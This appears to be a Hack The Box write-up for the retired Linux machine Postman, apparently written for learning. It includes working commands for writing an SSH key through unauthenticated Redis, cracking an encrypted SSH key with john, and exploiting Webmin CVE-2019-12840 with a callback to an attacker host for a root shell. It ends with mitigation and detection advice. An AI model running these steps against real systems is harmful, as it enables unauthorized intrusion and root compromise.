---
machine: Postman
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, redis, ssh, webmin, cve-2019-12840, privesc]
---

# Postman — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Redis listens without authentication and allows writing a file to `/var/lib/redis/.ssh/authorized_keys`, giving access as `redis`. `Matt`'s SSH key is encrypted and cracks; his password also works on Webmin 1.910, vulnerable to CVE-2019-12840. Exploiting the panel, which runs as root, gives a root shell.

## Recon

```bash
nmap -Pn -sCV -p22,80,6379,10000 <IP>
```

- `22` SSH, `80` Apache, `6379` Redis 4.0.9 and `10000` Webmin 1.910.
- `80` shows an under-construction page.
- Webmin only answers over HTTPS on `10000`.

## Enumeration

Redis requires no authentication and allows `CONFIG SET dir` and `CONFIG SET dbfilename`. Write to `redis`'s home with junk around the key, which `sshd` ignores.

```bash
redis-cli -h <IP> config set dir /var/lib/redis/.ssh
redis-cli -h <IP> config set dbfilename authorized_keys
cat key.txt | redis-cli -h <IP> -x set pwn
redis-cli -h <IP> save
```

## Foothold

Log in over SSH as `redis`.

```bash
ssh -i id_rsa redis@<IP>
```

## Lateral movement

`/opt` or the home has an encrypted `Matt` SSH key. `ssh2john` and `john` recover the passphrase; it also works for `su Matt`.

```bash
ssh2john matt_id_rsa > matt.hash
john --wordlist=rockyou.txt matt.hash
su Matt
```

## Privilege escalation

`Matt`'s password works on Webmin. Version 1.910 is vulnerable to CVE-2019-12840: the `u` parameter in `update.cgi` reaches `system()` and runs commands as root.

```bash
python3 cve-2019-12840.py -u https://<IP>:10000 -l <ATTACKER> -p 443
```

## Evidence

- Unauthenticated Redis and `authorized_keys` write.
- Access as `redis`.
- Encrypted `Matt` key and cracking.
- Webmin 1.910 and CVE-2019-12840.
- Root shell.

## Lessons learned

- Exposed Redis allows arbitrary file writes.
- Encrypted SSH keys fall to dictionary attacks.
- Reusing the system password on a panel is fatal.
- Old Webmin has authenticated RCE as root.

## Mitigation and detection

- Require Redis authentication and never expose it.
- Use strong, unique SSH key passphrases.
- Update Webmin and separate credentials.
- Monitor `CONFIG SET` and writes to `.ssh`.

## References

- [0xdf — Postman](https://0xdf.gitlab.io/2020/03/14/htb-postman.html)
- [IppSec — Postman](https://www.youtube.com/watch?v=jJnHET1o8ZQ)
- [Hack The Box — Postman](https://app.hackthebox.com/machines/postman)
